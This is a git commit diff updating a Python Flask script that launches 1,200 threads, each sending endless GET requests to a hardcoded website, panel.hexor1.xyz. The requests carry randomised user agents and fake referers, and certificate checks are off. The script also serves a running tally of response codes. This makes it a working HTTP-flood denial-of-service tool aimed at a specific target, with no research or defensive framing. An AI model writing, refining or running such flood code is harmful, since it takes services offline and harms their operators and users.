e5848061ae0426e8d7333d32328829b8a7c64e1c
MOREBI <mrb200king@gmail.com>
2025-03-30 06:20:08 +0000

    Update mrb2.py

--- mrb2.py
+++ mrb2.py
@@ -1,53 +1,51 @@
-from flask import Flask
+from flask import Flask, jsonify
 import requests
 import threading
 from bs4 import BeautifulSoup
 from fake_useragent import UserAgent
 import urllib3
 import time
-
+import random
 app = Flask(__name__)
-
-# تعطيل تحذيرات SSL
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-# تهيئة مولد وكيل المستخدم
 ua = UserAgent()
-
+accept_charset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
+headers_referers = [
+    "http://www.google.com/?q=",
+    "http://www.usatoday.com/search/results?q=",
+    "http://engadget.search.aol.com/search?q=",
+]
+stats = {"good": {}, "failed": 0}
+lock = threading.Lock()
 def chek(url):
     while True:
         try:
-            # توليد وكيل مستخدم عشوائي لكل طلب
             headers = {
                 "User-Agent": ua.random,
                 "Accept-Language": "en-US,en;q=0.9",
                 "Accept-Encoding": "gzip, deflate, br",
                 "Connection": "keep-alive",
+                "Accept-Charset": accept_charset,
+                "Referer": random.choice(headers_referers),
             }
             response = requests.get(url, headers=headers, verify=False)
             status_code = response.status_code
-            soup = BeautifulSoup(response.text, "html.parser")
-            title = soup.title.string if soup.title else "No Title"
-            print(f"[{status_code}] {title} - {url}")
-        except requests.exceptions.RequestException as e:
-            error_message = str(e)
-            if hasattr(e, 'response') and e.response is not None:
-                error_message = f"{e.response.status_code} - {e.response.reason}"
-            print(f"Request failed: {error_message}")
-        # تأخير بين الطلبات لتجنب الحظر
-       # time.sleep(5)
-
+            with lock:
+                stats["good"].setdefault(status_code, 0)
+                stats["good"][status_code] += 1
+        except requests.exceptions.RequestException:
+            with lock:
+                stats["failed"] += 1
 def start_threads():
-    target_url = "https://panel.hexor1.xyz/"  # ضع الرابط هنا
-    for _ in range(2000):
+    target_url = "https://panel.hexor1.xyz/"
+    for _ in range(1200):
         thread = threading.Thread(target=chek, args=(target_url,))
         thread.daemon = True
         thread.start()
-
 @app.route('/')
 def home():
-    return "Server is running with background threads!"
-
+    with lock:
+        return jsonify(stats)
 if __name__ == '__main__':
     threading.Thread(target=start_threads, daemon=True).start()
     app.run(host='0.0.0.0', port=5000)
